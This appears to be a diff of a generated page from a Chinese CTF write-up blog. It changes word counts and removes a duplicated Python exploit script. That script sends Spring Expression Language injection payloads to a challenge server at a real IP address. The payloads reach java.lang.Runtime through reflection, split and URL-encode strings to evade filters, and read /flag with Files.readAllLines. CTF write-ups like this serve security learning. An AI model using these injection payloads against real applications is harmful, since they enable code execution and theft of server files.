@@ -370,7 +370,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.5k
                 </div>
                 
 
@@ -447,30 +447,6 @@ Runtime
 <p>所以直接换成<code>readAllLines</code></p>
 <p>脚本</p>
 <pre><code>import requests
-import urllib
-session = requests.session()
-
-burp0_url = "http://106.52.164.141:80/spel/calc"
-
-payload="''['class'].forName('java.la'+'ng'+'.Runti'+'me').getDeclaredMethods()[15]"
-payload="T%28java.lang.Runtime)".replace('a','%61').replace('i','%69')
-payload="hasAuthority('/flag')"
-#payload="hasRole()"
-payload="{{'a'}}.stream()"
-payload="''.class.forName('java.'+'lang.'+'Runtim'+'e').getMethod()"
-payload="''.class.forName('java.io.File').listRoots()"
-
-payload="''.class.forName('java.nio.file.Files').readAllLines(''.class.forName('java.nio.file.Paths').get('/flag'))"
-
-
-print(payload)
-param={'calc':payload}
-
-req=session.get(burp0_url,params=param)
-print(req.text)
-
-
-import requests
 import urllib
 session = requests.session()
 
@@ -984,7 +960,7 @@ The command completed successfully.</code></pre><p>zip的密码应该就是<code
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">15.4k</span>&nbsp;字
+                class="white-color">15.3k</span>&nbsp;字
             
             
             
